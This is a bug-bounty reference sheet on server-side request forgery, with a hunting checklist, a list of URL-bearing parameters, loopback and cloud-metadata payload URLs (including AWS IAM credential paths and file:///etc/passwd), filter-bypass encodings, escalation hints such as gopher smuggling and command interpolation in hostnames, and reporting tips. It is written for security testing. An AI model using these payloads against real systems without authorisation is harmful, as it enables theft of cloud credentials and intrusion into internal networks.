# Server-Side Request Forgery (SSRF)

In a Server-Side Request Forgery (SSRF) attack, the attacker abuses server functionality that fetches URLs — reading or updating internal resources by supplying or modifying the URL the server-side code will request. By carefully selecting target URLs, an attacker can read server configuration such as cloud metadata, connect to internal services (HTTP-enabled databases, admin panels), or force POST requests towards internal services never intended to be exposed. Impact is typically high to critical: sensitive data exposure, unauthenticated internal requests, port scanning/XSPA, protocol smuggling, and escalation to RCE.

For SSRF where the response never returns to you (only out-of-band interaction is visible), see [Blind SSRF](./Blind_SSRF.md).

## Hunting Checklist

1. Find functionality that *fetches* on the server's behalf: URL importers, webhooks, image/PDF/document fetchers, RSS/feed integrations, preview generators, link unfurling, file converters, "load from URL" features, SSO/OAuth callbacks, proxy/forward params.
2. Crawl the whole web app (and APIs) with Burp proxy on and search for URL-ish parameter keywords (`?url=`, `?uri=`, `?req=`, ...). SSRFs are disproportionately common in APIs.
3. Run collected URLs through `gf ssrf` to grep parameters that may be vulnerable.
4. If you found an Open Redirect, try escalating it to SSRF (redirect the server itself).
5. Always verify the request originates from the **backend server**, not your browser — confirm via Collaborator/interactsh and by comparing server-side vs client-side behavior (key point: you are making the request *on behalf of the public server*, not from the browser).
6. Test loopback variants: both `http://localhost/xyz/` and `http://127.0.0.1/xyz` — some filters check only one.
7. Test cloud metadata endpoints (AWS/GCP/Azure/DigitalOcean/etc. below); on AWS the metadata host is `169.254.169.254`, so `127.0.0.1` alone won't reach it — use the link-local address.
8. If responses are filtered/blind, sign up with an email like `blabla.collaborator.net`: an **HTTP** interaction proves blind SSRF. DNS/SMTP-only interactions usually carry no impact — don't report those without one.
9. A server-side firewall may exist — always try to bypass it (see Bypass Techniques).
10. Confirm the fetch is not just a HEAD/canary: try to read actual internal content (`/`, admin paths, metadata).
11. Attempt escalation: RCE, XSS, or internal action execution (see Test Cases — Escalation).

## Test Cases & Examples

### Key points when testing

1. Always make sure you are making the request to the back-end server on behalf of the public server, not from the browser.
2. To fetch data from the server also try `http://localhost/xyz/` along with `http://127.0.0.1/xyz`.
3. The server may have firewall protection — always try to bypass it if possible.
4. Make sure the request is coming from the server, not from your local host.

### Where to look — common URL-bearing parameters

```
uri= url= u= page= proxy= fwd= forward= data= ret= r2= img= return r= redirect
redirectBack AuthState referer redir l= aspxerrorpath image_path ActionCodeURL
return_url link q location ReturnUrl referrer returnUrl forward file rb
end_display urlact from goto path redirect_url old pathlocation successTarget
returnURL urlsito newurl Url back retour odkazujuca r_link cur_url H_name ref
topic resource returnTo home node sUrl href linkurl returnto redirecturl SL st
errorUrl media destination targeturl return_to cancel_url doc GO ReturnTo
FileName logoutRedirectURL list startUrl service redirect_to end_url _next
noSuchEntryRedirect context returnurl ref_url logout_redirect_uri=
```

Example request shape:

```http
POST /api/fetch-preview HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

url=http://127.0.0.1/admin
```

### 1. SSRF attacks against the server itself

Induce the application to make an HTTP request back to its own server via the loopback interface — supply a URL with a hostname like `127.0.0.1` or `localhost`.

Basic localhost payloads:

```bash
http://127.0.0.1:port
http://localhost:port
https://127.0.0.1:port
https://localhost:port
http://[::]:port
http://0000::1:port
http://[0:0:0:0:0:ffff:127.0.0.1]
http://0/
http://127.1
http://127.0.1
file:///etc/passwd
```

Steps to reproduce:

1. Use Burp Collaborator to check if the server fetches data from an internal system (interacting with the backend).
2. Send the request to localhost.
3. Try to perform sensitive actions as an unauthenticated user (internal endpoints often skip auth).

### 2. Cloud instance metadata

AWS (EC2) — if the target runs on EC2, request:

```bash
http://instance-data
http://169.254.169.254
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/user-data
http://169.254.169.254/latest/user-data/iam/security-credentials/[ROLE NAME]
http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE NAME]
http://169.254.169.254/latest/meta-data/iam/security-credentials/flaws/
http://169.254.169.254/latest/meta-data/iam/security-credentials/IAM_USER_ROLE_HERE
http://169.254.169.254/latest/meta-data/iam/security-credentials/PhotonInstance
http://169.254.169.254/latest/meta-data/iam/security-credentials/s3access
http://169.254.169.254/latest/meta-data/iam/security-credentials/dummy
http://169.254.169.254/latest/meta-data/iam/security-credentials/ISRM-WAF-Role
http://169.254.169.254/latest/meta-data/ami-id
http://169.254.169.254/latest/meta-data/reservation-id
http://169.254.169.254/latest/meta-data/hostname
http://169.254.169.254/latest/meta-data/public-keys/
http://169.254.169.254/latest/meta-data/public-keys/0/openssh-key
http://169.254.169.254/latest/meta-data/public-keys/[ID]/openssh-key
http://169.254.169.254/latest/dynamic/instance-identity/document
```

Source: https://twitter.com/ADITYASHENDE17/status/1305051512335298562

Google Cloud:

```bash
http://169.254.169.254/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/
http://metadata/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/hostname
http://metadata.google.internal/computeMetadata/v1/instance/id
http://metadata.google.internal/computeMetadata/v1/project/project-id
```

Azure:

```bash
http://169.254.169.254/metadata/v1/maintenance
http://169.254.169.254/metadata/instance?api-version=2017-04-02
http://169.254.169.254/metadata/instance/network/interface/0/ipv4/ipAddress/0/publicIpAddress?api-version=2017-04-02&format=text
```

IPv6 tests:

```bash
http://[::ffff:169.254.169.254]
http://[0:0:0:0:0:ffff:169.254.169.254]
```

ECS Task credentials:

```bash
http://169.254.170.2/v2/credentials/
```

Digital Ocean:

```bash
http://169.254.169.254/metadata/v1.json
http://169.254.169.254/metadata/v1/
http://169.254.169.254/metadata/v1/id
http://169.254.169.254/metadata/v1/user-data
http://169.254.169.254/metadata/v1/hostname
http://169.254.169.254/metadata/v1/region
http://169.254.169.254/metadata/v1/interfaces/public/0/ipv6/address
```

Packetcloud:

```bash
https://metadata.packet.net/userdata
```

Oracle Cloud:

```bash
http://169.254.169.254/opc/v1/instance/
```

Alibaba Cloud:

```bash
http://100.100.100.200/latest/meta-data/
http://100.100.100.200/latest/meta-data/instance-id
http://100.100.100.200/latest/meta-data/image-id
http://100.100.100.200/latest/user-data
```

### 3. Blind SSRF via email signup

Sign up with an email such as `blabla.collaborator.net`. If you receive an **HTTP** request on Collaborator, it is blind SSRF. If there's no impact beyond that, don't report it — DNS and SMTP requests don't matter.

### 4. Escalation

- SSRF can be escalated to RCE (impact High): try command interpolation in a hostname that resolves and executes, e.g. `` `<os cmd>`.collaborator.net `` (thehackerish has a good video on this).
- If your SSRF only redirects and has no direct impact, try escalating to XSS (server fetches a URL you control that returns a malicious response processed by the app).
- Protocol smuggling: `gopher://`, `dict://`, `file://`, `ftp://` against internal services where the client library allows them.

## Bypass Techniques

1. **Bypass using HTTPS**

```bash
https://127.0.0.1/
https://localhost/
```

2. **Bypass localhost with `[::]`**

```bash
http://[::]:80/
http://[::]:25/    # SMTP
http://[::]:22/    # SSH
http://[::]:3128/  # Squid
http://0000::1:80/
http://0000::1:25/    # SMTP
http://0000::1:22/    # SSH
http://0000::1:3128/  # Squid
```

3. **Bypass localhost with a domain redirection**

```bash
http://spoofed.burpcollaborator.net
http://localtest.me
http://customer1.app.localhost.my.company.127.0.0.1.nip.io
http://mail.ebc.apple.com        # redirects to 127.0.0.6 == localhost
http://bugbounty.dod.network     # redirects to 127.0.0.2 == localhost
```

4. **Bypass localhost with CIDR-style notation**

```bash
http://127.127.127.127
http://127.0.1.3
http://127.0.0.0
```

5. **Bypass using decimal IP notation**

```bash
http://0177.0.0.1/
http://2130706433/   # = http://127.0.0.1
http://3232235521/   # = http://192.168.0.1
http://3232235777/   # = http://192.168.1.1
http://2852039166/   # = http://169.254.169.254
```

6. **Bypass using IPv6/IPv4 address embedding**

```bash
http://[0:0:0:0:0:ffff:127.0.0.1]
```

7. **Bypass using malformed URLs**

```
localhost:+11211aaa
localhost:00011211aaaa
```

8. **Bypass using rare addresses**

```bash
http://0/
http://127.1
http://127.0.1
```

9. **Bypass using URL encoding**

```bash
http://127.0.0.1/%61dmin
http://127.0.0.1/%2561dmin
```

10. **Bypass using parser-difference tricks**

```
http://1.1.1.1 &@2.2.2.2# @3.3.3.3/
urllib2 -> 1.1.1.1
requests + browsers -> 2.2.2.2
urllib -> 3.3.3.3
```

11. **Bypass using enclosed alphanumerics**

```
http://ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ   (= example.com)
```

Full list: ① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳ ⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇ ⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛ ⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵ Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ ⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴ ⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿

12. **Bypass PHP `filter_var()`**

```
0://evil.com:80;http://google.com:80/
```

13. **Bypass against a weak URL parser**

```bash
http://127.1.1.1:80\@127.2.2.2:80/
http://127.1.1.1:80\@@127.2.2.2:80/
http://127.1.1.1:80:\@@127.2.2.2:80/
http://127.1.1.1:80#\@127.2.2.2:80/
```

## Impact Summary

A malicious actor can retrieve the content of arbitrary files on the system, leading to sensitive information exposure (passwords, source code, confidential data, etc.):

1. Sensitive Data Exposure (cloud meta-data, internal files, DB HTTP interfaces)
2. Unauthenticated Requests to internal-only endpoints
3. Port Scans / Cross Site Port Attack (XSPA)
4. Protocol Smuggling
5. Escalation to RCE / XSS

An attacker can tunnel into internal networks and access sensitive internal data such as AWS metadata (including IAM credentials).

## Tools & Resources

- PortSwigger SSRF article & labs: https://portswigger.net/web-security/ssrf
- HackTricks SSRF page: https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery
- PayloadsAllTheThings — SSRF: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery
- AllThingsSSRF: https://github.com/jdonsec/AllThingsSSRF
- gf-ssrf patterns, Burp Collaborator / interactsh, ffuf for param fuzzing
- "A New Era of SSRF" by Orange Tsai: https://www.youtube.com/watch?v=R9pJ2YCXoJQ ( https://blog.orange.tw/ )
- HackerOne SSRF hacktivity: https://hackerone.com/hacktivity?order_field=popular&filter=type%3Apublic&querystring=SSRF

Videos:

- https://www.youtube.com/watch?v=U0bPPw6uPgY&t=1s
- https://www.youtube.com/watch?v=324cZic6asE
- https://www.youtube.com/watch?v=o-tL9ULF0KI
- https://www.youtube.com/watch?v=324cZic6asE&t=751s
- https://youtu.be/m4BxIf9PUx0
- https://youtu.be/apzJiaQ6a3k

HackerOne report references:

- https://hackerone.com/reports/737161
- https://hackerone.com/reports/816848
- https://hackerone.com/reports/398799
- https://hackerone.com/reports/382048
- https://hackerone.com/reports/406387
- https://hackerone.com/reports/736867
- https://hackerone.com/reports/517461
- https://hackerone.com/reports/508459
- https://hackerone.com/reports/738553
- https://hackerone.com/reports/514224
- https://hackerone.com/reports/341876
- https://hackerone.com/reports/793704
- https://hackerone.com/reports/386292
- https://hackerone.com/reports/326040
- https://hackerone.com/reports/310036
- https://hackerone.com/reports/643622
- https://hackerone.com/reports/885975
- https://hackerone.com/reports/207477
- https://www.hackerone.com/blog-How-To-Server-Side-Request-Forgery-SSRF

Blogs & writeups:

- https://medium.com/@madrobot/ssrf-server-side-request-forgery-types-and-ways-to-exploit-it-part-1-29d034c27978
- https://medium.com/@madrobot/ssrf-server-side-request-forgery-types-and-ways-to-exploit-it-part-2-a085ec4332c0
- https://medium.com/@madrobot/ssrf-server-side-request-forgery-types-and-ways-to-exploit-it-part-3-b0f5997e3739
- https://medium.com/@kapilvermarbl/ssrf-server-side-request-forgery-5131ffd61c3c
- https://medium.com/@zain.sabahat/exploiting-ssrf-like-a-boss-c090dc63d326
- https://medium.com/@chawdamrunal/what-is-server-side-request-forgery-ssrf-7cd0ead0d95f
- https://medium.com/swlh/ssrf-in-the-wild-e2c598900434
- https://medium.com/swlh/intro-to-ssrf-beb35857771f
- https://medium.com/@briskinfosec/ssrf-server-side-request-forgery-ae44ec737cb8
- https://medium.com/@GAYA3_R/vulnerability-server-side-request-forgery-ssrf-9fe5428184c1
- https://medium.com/@gupta.bless/exploiting-ssrf-for-admin-access-31c30457cc44
- https://medium.com/bugbountywriteup/server-side-request-forgery-ssrf-f62235a2c151
- https://medium.com/bugbountywriteup/server-side-request-forgery-ssrf-testing-b9dfe57cca35
- https://medium.com/bugbountywriteup/tagged/ssrf
- https://medium.com/@dlpadmavathi.us/ssrf-attack-real-example-a7279256abee
- https://medium.com/poka-techblog/server-side-request-forgery-ssrf-attacks-part-1-the-basics-a42ba5cc244a
- https://medium.com/seconset/all-about-ssrf-524f41ab96df
- https://blog.securityinnovation.com/the-many-faces-of-ssrf
- https://www.netsparker.com/blog/web-security/server-side-request-forgery-vulnerability-ssrf/
- https://blog.appsecco.com/finding-ssrf-via-html-injection-inside-a-pdf-file-on-aws-ec2-214cc5ec5d90
- https://blog.cobalt.io/from-ssrf-to-port-scanner-3e8ef5921fbf
- https://www.reddit.com/r/bugbounty/comments/cux2zs/ssrf_in_the_wild_the_startup_medium/
- http://www.techpna.com/uptzh/blind-ssrf-medium.html
- http://institutopaideia.com.br/journal/blind-ssrf-medium-cfa769
- https://www.sonrn.com.br/blog/5a44cc-blind-ssrf-medium
- https://ssrf-bypass-medium.thickkare.pw/
- https://www.zerocopter.com/vulnerabilities-price-list-printable

## Report Tips

- Prove the request came from the *server* (Collaborator HTTP interaction with server IP / internal response content), not from your own browser.
- Severity framing: AWS/GCP metadata with IAM credentials or internal admin panel access → critical; blind HTTP interaction without further data → medium/low, and DNS/SMTP-only interaction → usually N/A.
- Include which bypass was required (filter present = stronger finding) and any escalation achieved (port scan results, file read, RCE/XSS chain).

---
*Authors: [Tushar Verma](https://twitter.com/e11i0t_4lders0n), [@0xCyberPirate](https://twitter.com/0xCyberPirate), [0xrtt](https://twitter.com/0xrtt)*
